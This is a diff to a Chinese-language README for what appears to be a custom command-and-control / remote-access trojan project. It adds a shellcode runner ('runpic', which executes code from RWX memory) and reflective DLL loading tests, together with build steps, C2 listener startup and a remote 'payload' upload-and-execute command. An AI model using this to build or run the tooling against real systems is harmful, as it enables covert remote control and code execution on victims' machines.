@@ -14,7 +14,8 @@
 - **控制端**：Go CLI（`ratctl`）+ C++ GUI（`im_ctl`）+ C++ 轻量查看器（`viewer`）
 - **协议**：自定义二进制（20B 固定头 + 分模块指令码），AES-256-GCM 加密（PSK→HKDF 派生）
 - **当前状态**：核心通信 + beacon/TCP 双信道 + 屏幕流/输入回放 + 截屏 + **payload 上传执行** +
-  ratctl 命令补全 + viewer 查看器 + **RatAgent 的 DLL 形态（rundll32 / LoadLibrary / 注入）**
+  ratctl 命令补全 + viewer 查看器 + **RatAgent 的 DLL 形态（rundll32 / LoadLibrary / 注入）** +
+  **反射加载实测**（外部 RfUdrl 出 PIC，`tools/runpic` 执行）
   （详见 `docs/DESIGN.md`、`docs/PROGRESS.md`）
 
 ## 目录结构
@@ -38,7 +39,8 @@ c2/
 │                              # + agent_runtime(共用运行核心) / agent_dll(导出) / main(EXE 入口)
 ├── viewer/                    # C++ Win32 远控查看器（独立 CMake 工程）
 ├── im_ctl/                    # C++ ImGui 控制端
-└── scripts/                   # e2e_m1~m4 + ctl_stream_probe
+├── tools/runpic/              # PIC blob 执行器（反射加载验证 harness，配合外部 loader）
+└── scripts/                   # e2e_m1~m4 + e2e_rdll + ctl_stream_probe
 ```
 
 ## 构建
@@ -115,6 +117,17 @@ cmake --build im_ctl/build --config Debug
 > `imgui`（含 `backends/`）、`glad`（含 `src/glad.c`）、`glfw`（含 `lib-vc2026/glfw3.lib`）
 > 放到 `im_ctl/external/` 下，或改用 git submodule。viewer 不依赖这些，可直接构建。
 
+**runpic**（PIC blob 执行器，反射加载验证用）：
+
+```
+cmake -S tools/runpic -B build/runpic
+cmake --build build/runpic --config Release    # 产物 build/runpic/bin/runpic.exe
+```
+
+> 用法：`runpic.exe <pic.bin> [--hold <秒>]`。它只负责把 PIC 跑起来（RWX 映射 +
+> `CreateThread` 进偏移 0 的 `go()`），加载逻辑在 PIC 内部（如外部 RfUdrl loader）；
+> 详见 `docs/PROGRESS.md` §8.5 与 `scripts/e2e_rdll.py`。
+
 ## 运行与联调
 
 1. 启动 C2：`./bin/c2server.exe`（监听 4444 + 4445 + 8080，PSK 编译期内置）
@@ -136,7 +149,8 @@ stop                              停止当前 Agent 的屏幕流
 payload <file> [name] [--args <参数>] 上传二进制 payload 并执行
 ```
 
-4. 自动验收：`python scripts/e2e_m3.py`（beacon + ratctl）、`python scripts/e2e_m4.py`（屏幕流）
+4. 自动验收：`python scripts/e2e_m3.py`（beacon + ratctl）、`python scripts/e2e_m4.py`（屏幕流）、
+   `python scripts/e2e_rdll.py`（反射加载：需先有 `build/e2e/out.bin`，见 `docs/PROGRESS.md` §8.5）
 
 ## 协议要点
 
